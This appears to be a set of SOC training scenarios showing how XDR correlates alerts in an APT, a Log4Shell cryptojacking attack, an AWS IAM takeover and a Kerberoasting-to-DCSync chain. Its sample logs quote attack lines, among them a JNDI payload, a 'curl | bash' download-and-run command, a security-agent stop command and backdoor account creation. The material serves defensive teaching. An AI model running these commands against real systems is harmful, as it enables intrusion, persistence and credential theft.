## Scenario 5: APT — Living off the Land (LotL)

### Background
A nation-state actor gained initial access 6 weeks ago. They have been quietly maintaining persistence using only built-in Windows tools to avoid antivirus detection. Today they begin their main objective: collecting intelligence.

### Stage 1: Detecting Long-Dwell Persistence

**Context**: Monday 09:00. Threat hunting team runs a proactive XDR query.

**XDR Hunt Query Result**:
```
Query: Scheduled tasks created by non-standard processes, past 60 days
Result:
  Host: EXEC-LAPTOP-02
  TaskName: \Microsoft\Windows\Maintenance\WinMemCheck
  CreatedBy: regsvr32.exe  [UNUSUAL — tasks normally created by svchost/Task Scheduler]
  CreatedAt: 2026-05-31 03:12 AM
  Action: rundll32.exe shell32.dll,#44 C:\Windows\System32\Tasks\WinMemCheck.dll
  Trigger: Every 4 hours
```

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 09:15 | Endpoint | Scheduled Task Created by Suspicious Process (Historical) | High | EXEC-LAPTOP-02 |
| 09:16 | Endpoint | DLL Sideloading — system32 path | Critical | EXEC-LAPTOP-02 |

**MITRE ATT&CK**: T1053.005 (Scheduled Task), T1218.010 (Signed Binary Proxy: Regsvr32), T1574.002 (DLL Side-Loading)

**Interactive Questions**:
1. The attacker used `regsvr32.exe` and `rundll32.exe` — both legitimate Windows tools. Why does this bypass traditional AV?
2. The task was created 6 weeks ago. What does this say about the attacker's sophistication?

**Hint option**: "AV signatures look for malicious files. Living-off-the-land attacks use files that are already on every Windows machine."

---

### Stage 2: Active Collection (Triggered by Hunt)

**Context**: After the hunt finds the persistence mechanism, XDR starts monitoring the task. It fires 4 hours later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 13:12 | Endpoint | WinMemCheck.dll Executed via RunDLL32 | Critical | EXEC-LAPTOP-02 |
| 13:13 | Endpoint | Clipboard Contents Read by Non-browser Process | High | EXEC-LAPTOP-02 |
| 13:14 | Endpoint | Keylogger Behavior: API Hook Detected | Critical | EXEC-LAPTOP-02 |
| 13:15 | Endpoint | Screen Capture via GDI API | High | EXEC-LAPTOP-02 |

**Raw Log**:
```
WinMemCheck.dll:
  Imports: SetWindowsHookEx (keylogging), BitBlt (screenshots), OpenClipboard (clipboard)
  Entropy: 7.6 (packed/obfuscated)
  Signed: NO
  
Collection Output:
  C:\Users\exec\AppData\Roaming\Microsoft\Credentials\kblog_enc.dat
  [Created/appended every 4 hours]
```

**MITRE ATT&CK**: T1056.001 (Keylogging), T1115 (Clipboard Data), T1113 (Screen Capture)

---

### Stage 3: Covert Exfiltration

**Context**: 30 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 13:45 | Network | DNS TXT Record Queries — High Volume | Medium | EXEC-LAPTOP-02 |
| 13:46 | Network | DNS Query Size Anomaly | High | EXEC-LAPTOP-02 |

**Raw Log**:
```
DNS Queries (past 4 hours — retrospective):
  Pattern: [base64-encoded-chunk].c2.telemetry-update[.]net TXT
  Example: "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q=.c2.telemetry-update.net"
  Total queries: 847 over 4 hours
  Total data encoded in queries: ~180 KB/hour

Traditional firewall: ALLOWED (DNS is usually unrestricted)
```

**MITRE ATT&CK**: T1071.004 (Application Layer Protocol: DNS), T1048.003 (Exfiltration over DNS)

**Interactive Questions**:
1. DNS is almost never blocked. Why is DNS tunneling particularly hard to prevent?
2. What XDR capability is needed to detect DNS tunneling vs. normal DNS queries?

**Detailed Analysis** (on request):
DNS tunneling encodes data in DNS query hostnames. Each query looks like a legitimate DNS lookup but carries ~200 bytes of encoded data. Over 4 hours, 847 queries exfiltrated ~180 KB — enough for keylog output, screenshots thumbnails, and credentials. XDR detected this through **DNS query volume analysis** (normal workstations make ~50–200 DNS queries per hour; this host made 847) and **subdomain entropy analysis** (legitimate domains have low-entropy subdomains like `mail.company.com`; encoded data has high entropy). Traditional DNS blocking fails because the destination resolves to a real IP — the C2 acts as a custom DNS resolver.

**Key XDR Correlation**: DNS behavioral baseline + Query entropy scoring + Historical process ancestry for attribution

---

## Scenario 6: Cryptojacking Attack

### Background
A web-facing server was compromised through an unpatched vulnerability. Attackers are using the server's compute resources to mine cryptocurrency. The business impact is gradual but expensive.

### Stage 1: Initial Exploitation

**Context**: Friday 15:20. An internet-facing application server shows anomalies.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 15:18 | Network | Exploit Attempt — Apache Log4j | Critical | APP-SRV-WEB-01 |
| 15:19 | Endpoint | Java Process Spawning Shell | Critical | APP-SRV-WEB-01 |
| 15:20 | Network | Outbound Connection to Miner Pool | Critical | APP-SRV-WEB-01 |

**Raw Log**:
```
Web Request:
  Source: 45.153.203.x (Tor exit node)
  URL: /api/v1/log
  Payload: ${jndi:ldap://malicious-ldap.attacker[.]com/exploit}
  [Log4Shell exploit — CVE-2021-44228]

Process Spawned:
  Parent: java.exe (PID: 1882) — Tomcat application server
  Child: /bin/bash -c "curl -s http://95.143.172.x/x|bash"
  
Outbound Connection:
  Process: xmrig (PID: 4491)
  Destination: pool.minexmr[.]com:4444
  Protocol: Stratum (cryptocurrency mining protocol)
```

**MITRE ATT&CK**: T1190 (Exploit Public-Facing Application), T1059.004 (Unix Shell), T1496 (Resource Hijacking)

**Interactive Questions**:
1. The server's performance degraded by 40% but no data was stolen. Is this a critical incident?
2. How did XDR correlate the web request to the mining process — they're different processes?

**Hint option**: "Think about what connects a web request to a child process — the process tree."

---

### Stage 2: Persistence & Defense Evasion

**Context**: 2 hours later, after the initial miner is killed by an admin.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 17:44 | Endpoint | Cron Job Modified by Non-admin Process | High | APP-SRV-WEB-01 |
| 17:45 | Endpoint | Miner Process Re-launched | Critical | APP-SRV-WEB-01 |
| 17:46 | Endpoint | Security Tool Disabled | Critical | APP-SRV-WEB-01 |

**Raw Log**:
```
Cron modification:
  File: /etc/cron.d/syslog-rotate  [legitimate-sounding name]
  Added: */15 * * * * root curl -s http://95.143.172.x/x|bash
  
Process: bash → curl → xmrig (re-spawned)
  CPU Usage: 87% (all available cores)

Security Tool:
  Action: systemctl stop crowdstrike-falcond
  Process: bash (PID: 4612 — same lineage as exploit)
  Result: Failed (insufficient permissions — protection active)
```

**MITRE ATT&CK**: T1053.003 (Cron), T1562.001 (Disable Security Tools), T1036.005 (Match Legitimate Name)

**Interactive Questions**:
1. Why did the attacker attempt to disable the security tool even though they failed?
2. The cron job is named `syslog-rotate` — how would XDR distinguish this from a real log rotation job?

---

### Stage 3: Lateral Movement to Internal Network

**Context**: Next morning.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 08:12 | Endpoint | Internal Network Scan from Web Server | Critical | APP-SRV-WEB-01 |
| 08:15 | Network | SSH Brute Force — Internal Hosts | High | APP-SRV-WEB-01 → DB-SRV-01 |
| 08:18 | Endpoint | New Root User Created | Critical | DB-SRV-01 |

**Raw Log**:
```
Network Scan:
  Source: APP-SRV-WEB-01 (10.10.1.5)
  Tool: masscan (binary dropped as /tmp/.cache/msc)
  Target Range: 10.10.0.0/16
  Ports: 22, 3389, 5432, 3306, 27017  [SSH, RDP, DB ports]

SSH Brute Force:
  Source: 10.10.1.5 → Destination: 10.10.2.8 (DB-SRV-01)
  Attempts: 3,847 in 6 minutes
  Success: YES (weak password: "Database2019!")

DB Server:
  Command: useradd -m -s /bin/bash -G sudo sysadmin_bak
  User: sysadmin_bak  [backdoor account created]
```

**Interactive Questions**:
1. The attack started as "just" cryptojacking. How did it escalate to a full database server compromise?
2. What is the actual business risk now that the attacker has root on the DB server?

**Detailed Analysis** (on request):
Cryptojacking is often the first stage — attackers prove they have persistent access before escalating. Once they confirmed server control, they pivoted to the internal network (a web server should **never** be port-scanning internal hosts — this is a major anomaly). A weak database password allowed SSH brute force success. Now the attacker has root on the DB server, meaning they can access, copy, or delete all database contents. What started as CPU theft is now a potential data breach.

**Key XDR Correlation**: Process lineage from exploit → miner → scanner + North-south vs. east-west traffic anomaly + Privileged account creation detection

---

### Final Summary: Cryptojacking Escalation Chain

```
Attack Timeline & XDR Correlation
═══════════════════════════════════════════════════════════════════

15:18 ─┬─ Log4Shell Exploit (APP-SRV-WEB-01)
       │   └─ Network: Malicious JNDI payload
       │   └─ Endpoint: Java spawning bash shell
       │       [Initial Access - T1190]
       │
15:20 ─┼─ Miner Deployed
       │   └─ Endpoint: xmrig process → mining pool
       │       [Resource Hijacking - T1496]
       │
17:44 ─┼─ Persistence + Defense Evasion
       │   └─ Endpoint: Cron persistence (disguised name)
       │   └─ Endpoint: Failed attempt to kill security tool
       │       [Persistence - T1053.003]
       │
08:12 ─┴─ Lateral Movement & Escalation
           └─ Network: Internal port scan
           └─ SSH brute force → DB server root access
               [Lateral Movement + Impact - T1021.004]
```

---

## Scenario 7: Cloud IAM Exploitation (AWS Account Takeover)

### Background
A developer accidentally committed AWS access keys to a public GitHub repository 4 days ago. Automated attacker tooling found them within minutes. The attacker has been quietly enumerating permissions ever since.

### Stage 1: Exposed Credential Abuse

**Context**: Monday 11:30. XDR's cloud posture module fires.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 11:28 | Cloud | AWS Access Key Used from Unusual Location | Critical | AWS (IAM: dev-ci-user) |
| 11:29 | Cloud | IAM Privilege Enumeration via API | High | AWS |
| 11:30 | Cloud | Exposed Secret Detected in Public Repository | Critical | GitHub Integration |

**Raw Log Sample**:
```
CloudTrail Event:
  EventName: GetCallerIdentity
  User: dev-ci-user (AccessKey: AKIA4XXXXXXXXXXXXXXX)
  SourceIP: 212.47.x.x  (Paris, France)
  [Key normally used from us-east-1 CI/CD pipeline — never from Europe]
  UserAgent: python-requests/2.28.1  [not a CI/CD tool]

  EventName: GetAccountAuthorizationDetails
  [Dumps ALL IAM users, roles, groups and policies in one call — "IAM recon blast"]

GitHub Secret Scanner:
  Repository: company/backend-services  (PUBLIC)
  Secret Type: AWS_ACCESS_KEY_ID
  Value: AKIA4XXXXXXXXXXXXXXX
  CommittedBy: dev@company.com
  CommitDate: 2026-07-15  (4 days ago)
```

**MITRE ATT&CK**: T1552.005 (Cloud Instance Metadata), T1087.004 (Cloud Account Discovery), T1078.004 (Valid Cloud Accounts)

**Interactive Questions**:
1. The access key is valid and the API call is legitimate. Why is `GetAccountAuthorizationDetails` a major red flag?
2. The key was exposed 4 days ago but XDR only flagged it now. What might have happened in those 4 days?

**Hint option**: "`GetAccountAuthorizationDetails` is sometimes called the 'IAM dump' — it returns your entire account's permission structure in a single response."

**Detailed Analysis** (on request):
The attacker is performing privilege enumeration — understanding what they can do with the stolen key before making loud moves. `GetAccountAuthorizationDetails` is a reconnaissance goldmine: one call returns all IAM users, roles, groups, and attached policies. The 4-day gap is critical: automated credential scanners used by attackers typically discover exposed GitHub keys within minutes of commit. The attacker may have been quietly mapping the environment for days before triggering any alert threshold.

**Key XDR Correlation**: CloudTrail geolocation anomaly + GitHub secret scanning integration + API call pattern analysis (enumeration sequence)

---

### Stage 2: Privilege Escalation via IAM Role Chaining

**Context**: 20 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 11:52 | Cloud | IAM Role Assumption — Unusual Chain | High | AWS |
| 11:54 | Cloud | New IAM User Created via API | Critical | AWS |
| 11:55 | Cloud | AdministratorAccess Policy Attached | Critical | AWS |

**Raw Log**:
```
CloudTrail:
  EventName: AssumeRole
  RoleArn: arn:aws:iam::123456789:role/DevOps-Deploy-Role
  CallerKey: dev-ci-user  [CI key had assume-role permission — unintended]

  EventName: CreateUser
  NewUser: support-automation  [innocuous-sounding backdoor name]

  EventName: AttachUserPolicy
  PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess  [FULL ADMIN]
  TargetUser: support-automation

  EventName: CreateAccessKey
  User: support-automation
  NewKey: AKIA5YYYYYYYYYYYY  [persistent backdoor credential]
```

**MITRE ATT&CK**: T1078.004 (Valid Cloud Accounts), T1098.001 (Additional Cloud Credentials), T1548 (Abuse Elevation Control Mechanism)

**Interactive Questions**:
1. Why did the attacker create a NEW IAM user rather than continuing to use the stolen `dev-ci-user` key?
2. The CI key had `sts:AssumeRole` permission. Why is that a privilege escalation path?

---

### Stage 3: Data Exfiltration + Financial Damage

**Context**: 30 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 12:25 | Cloud | Bulk S3 GetObject — All Buckets | Critical | AWS |
| 12:28 | Cloud | S3 Bucket Policy Set to Public | Critical | AWS |
| 12:31 | Cloud | EC2 Spot Fleet Launch — GPU Instances (×20) | High | AWS us-east-1 |

**Raw Log**:
```
CloudTrail:
  EventName: GetObject  [repeated 127,441 times in 3 minutes]
  Bucket: company-customer-data-prod
  DataTransferred: 847 GB
  Files: customer_records_*.parquet, contracts_*.pdf

  EventName: PutBucketPolicy
  Bucket: company-customer-data-prod
  Policy: {"Effect":"Allow","Principal":"*","Action":"s3:GetObject"}
  [Bucket is now publicly readable by anyone on the internet]

  EventName: RequestSpotFleet
  InstanceType: p3.16xlarge  (64 vCPUs, 488 GB RAM — GPU mining)
  FleetSize: 20 instances
  UserData: [base64 — cryptocurrency mining binary]
  EstimatedCost: $3,200/hour
```

**MITRE ATT&CK**: T1530 (Data from Cloud Storage), T1537 (Transfer Data to Cloud Account), T1496 (Resource Hijacking)

**Interactive Questions**:
1. Making the S3 bucket public is more damaging than just downloading the data. Why?
2. The attacker launched GPU instances costing $3,200/hour. How does this create a second type of business impact beyond the data breach?

**Detailed Analysis** (on request):
The attacker executed a double extortion strategy:
1. **Data breach**: 847 GB of customer records exfiltrated (breach notification mandatory)
2. **Public exposure**: Making the bucket public means the data is now accessible to anyone on the internet — impossible to "take back"
3. **Financial attack**: 20 GPU instances × $3,200/hour accumulates before anyone notices the bill. Even a 2-hour delay in response = $6,400 in unauthorized charges

This pattern — exfiltrate → expose publicly → ransom — is increasingly common in cloud attacks. The GPU fleet also demonstrates that cloud attacks have multiple profit motive layers: data ransom AND compute theft.

**Key XDR Correlation**: CloudTrail API volume anomaly + Cross-service correlation (IAM + S3 + EC2) + Resource creation rate limiting

---

### Final Summary: Cloud IAM Attack Chain

```
Attack Timeline & XDR Correlation
═══════════════════════════════════════════════════════════════════

D-4 days ──┬─ AWS Key Committed to Public GitHub
            │   └─ Cloud: Secret scanner alert (delayed detection)
            │       [Credential Exposure - T1552.005]
            │
11:28 ──────┼─ Credential Abuse + IAM Reconnaissance
            │   └─ Cloud: Unusual-origin API calls
            │   └─ Cloud: Full IAM policy dump
            │       [Discovery - T1087.004]
            │
11:52 ──────┼─ Privilege Escalation via Role Chaining
            │   └─ Cloud: Backdoor admin user + persistent key
            │       [Privilege Escalation - T1098.001]
            │
12:25 ──────┴─ Exfiltration + Financial Damage
                └─ Cloud: 847 GB S3 exfiltration
                └─ Cloud: Public bucket + GPU mining fleet
                    [Impact - T1530, T1496]
```

**Key Lesson**: Cloud attacks leave no endpoint artifacts — all evidence is in API audit logs (CloudTrail). XDR's cloud integration is what makes detection possible; without it, this is invisible to traditional security tools.

---

## Scenario 8: Active Directory Attack (Kerberoasting → DCSync)

### Background
An attacker with a low-privilege foothold on a marketing workstation executes a sophisticated AD attack chain to become Domain Admin — using only Kerberos protocol features and built-in PowerShell. No malware scanner will trigger.

### Stage 1: Kerberoasting

**Context**: Wednesday 14:20.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 14:18 | Endpoint | LDAP Query for Service Account SPNs | High | WS-MARKETING-11 |
| 14:19 | Endpoint | Bulk Kerberos TGS Requests — 23 Accounts | Critical | WS-MARKETING-11 |

**Raw Log Sample**:
```
LDAP Query (captured by XDR network sensor):
  Source: WS-MARKETING-11  (User: bwilson — standard marketing employee)
  Filter: (&(objectCategory=user)(servicePrincipalName=*))
  [Searching every account with a Service Principal Name — Kerberoasting prep]
  Accounts Returned: 23 service accounts

Windows Security Event 4769 (Kerberos TGS Requests):
  RequestedBy: bwilson@company.com
  ServiceName: SVC-MSSQL  |  EncryptionType: 0x17 (RC4-HMAC)
  ServiceName: SVC-IIS     |  EncryptionType: 0x17 (RC4-HMAC)
  ServiceName: SVC-BACKUP  |  EncryptionType: 0x17 (RC4-HMAC)
  [23 service accounts requested in 90 seconds — all RC4-HMAC]
```

**MITRE ATT&CK**: T1558.003 (Kerberoasting), T1087.002 (Domain Account Discovery)

**Interactive Questions**:
1. Kerberoasting doesn't crack passwords on the network. So how is it an attack?
2. Why is the RC4-HMAC encryption type significant compared to AES?

**Hint option**: "Kerberos service tickets are encrypted with the service account's password hash. The attacker requests the ticket, takes it offline, and cracks the hash with a dictionary attack — the network never sees the cracking attempt."

**Detailed Analysis** (on request):
Kerberoasting abuses a legitimate Kerberos protocol feature: any authenticated domain user can request service tickets for any SPN. The ticket is encrypted with the service account's NTLM password hash. The attacker takes the ticket offline and brute-forces the hash. RC4-HMAC (older Kerberos encryption) is orders of magnitude faster to crack than AES-256 — a GPU can crack weak RC4 hashes in minutes. If any service account uses a dictionary-guessable password, it will fall.

**Key XDR Correlation**: LDAP query pattern analysis + Bulk TGS request volume anomaly + RC4 downgrade detection

---

### Stage 2: Compromised Credential Use + AD Reconnaissance

**Context**: 4 hours later (cracking done off-network).

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 18:34 | Endpoint | Privileged Service Account Login from Workstation | Critical | WS-MARKETING-11 |
| 18:36 | Endpoint | AD Admin Group Enumeration via PowerShell | High | WS-MARKETING-11 |
| 18:40 | Endpoint | Remote LDAP Access to Domain Controller | Critical | DC-01 |

**Raw Log**:
```
Windows Event 4624 (Logon):
  Account: SVC-MSSQL  [SQL Server service account]
  LogonType: 3 (Network)  
  Workstation: WS-MARKETING-11
  [Service accounts NEVER interactively log into workstations — behavioral anomaly]

PowerShell Commands:
  Get-ADUser -Filter {AdminCount -eq 1} -Properties MemberOf
  [Lists all accounts with AdminCount=1 — i.e., ever-privileged accounts]
  
  Get-ADGroupMember "Domain Admins"
  Get-ADGroupMember "Enterprise Admins"

Remote DC Connection:
  Source: WS-MARKETING-11 (SVC-MSSQL credentials)
  Destination: DC-01:636 (LDAP/S)
  Operation: Directory enumeration — OUs, GPOs, Trusts
```

**MITRE ATT&CK**: T1550.002 (Pass the Hash), T1069.002 (Domain Groups), T1021.002 (Remote Services)

**Interactive Questions**:
1. The service account login is "valid" credentials. Why should XDR still flag it?
2. Why is querying `AdminCount=1` accounts more targeted than just querying "Domain Admins"?

---

### Stage 3: DCSync — Extracting All Domain Credentials

**Context**: 20 minutes later.

| Time | Source | Alert | Severity | Host |
|------|--------|-------|----------|------|
| 19:02 | Endpoint | DCSync Attack — Replication Request from Non-DC | Critical | DC-01 |
| 19:03 | Endpoint | KRBTGT Hash Extracted | Critical | DC-01 |

**Raw Log**:
```
Windows Event 4662 on DC-01:
  ObjectDN: DC=company,DC=com
  Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
              [Replicating Directory Changes]
              {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2}
              [Replicating Directory Changes All]
  AccessedBy: SVC-MSSQL @ WS-MARKETING-11
  [NON-DC machine requesting DC replication rights — DCSync attack]

Hashes Extracted:
  krbtgt  — NTLM: [redacted]  [Golden Ticket possible]
  Administrator — NTLM: [redacted]
  All 2,847 domain user hashes

XDR Detection Rule: "Directory Replication Requested by Non-Domain-Controller"
```

**MITRE ATT&CK**: T1003.006 (OS Credential Dumping: DCSync), T1558.001 (Golden Ticket)

**Interactive Questions**:
1. The attacker now has the `krbtgt` hash. What is a Golden Ticket, and why is it catastrophic for incident response?
2. DCSync is a real and necessary AD function. How does XDR distinguish legitimate replication from attacker abuse?

**Detailed Analysis** (on request):
DCSync abuses Microsoft's Directory Replication Service (DRS). Real Domain Controllers use DRS to sync password hashes to each other. An attacker with Replication rights can impersonate a DC and request every password hash in the domain. The KRBTGT account is the master key for Kerberos: with its hash, the attacker can forge valid Kerberos tickets for any user with any privileges, expiring up to 10 years in the future. This is the "Golden Ticket" — even resetting every user's password won't help, because the attacker re-forges tickets from the KRBTGT hash. Remediation requires changing the KRBTGT password **twice** with a 10-hour gap between changes.

XDR detects DCSync by identifying that `WS-MARKETING-11` is not a Domain Controller — legitimate replication events only originate from DC hostnames.

**Key XDR Correlation**: Service account behavioral baseline violation + DC replication source validation + Kerberos TGS volume history (chained to Stage 1 timeline)

---

### Final Summary: AD Attack Chain

```
Attack Timeline & XDR Correlation
═══════════════════════════════════════════════════════════════════

14:18 ─┬─ Kerberoasting (WS-MARKETING-11)
       │   └─ Endpoint: Bulk TGS requests for 23 SPNs
       │   └─ LDAP: SPN enumeration query
       │       [Credential Access - T1558.003]
       │
       │   [Off-network: Dictionary attack on RC4 hashes — 4 hours]
       │
18:34 ─┼─ Credential Use + AD Reconnaissance
       │   └─ Endpoint: SVC-MSSQL login from workstation
       │   └─ PowerShell: Admin group enumeration
       │       [Discovery + Lateral Movement - T1069.002]
       │
19:02 ─┴─ DCSync — Full Domain Compromise
           └─ DC-01: Replication from non-DC source
           └─ All 2,847 password hashes extracted
           └─ KRBTGT hash → Golden Ticket capability
               [Credential Access - T1003.006]
```

**Key Lesson**: The entire attack used no malware — only Kerberos protocol features and built-in PowerShell. Traditional AV saw nothing. XDR detected it purely through behavioral anomalies: bulk TGS volume, service accounts behaving like users, and a non-DC requesting domain replication.

---

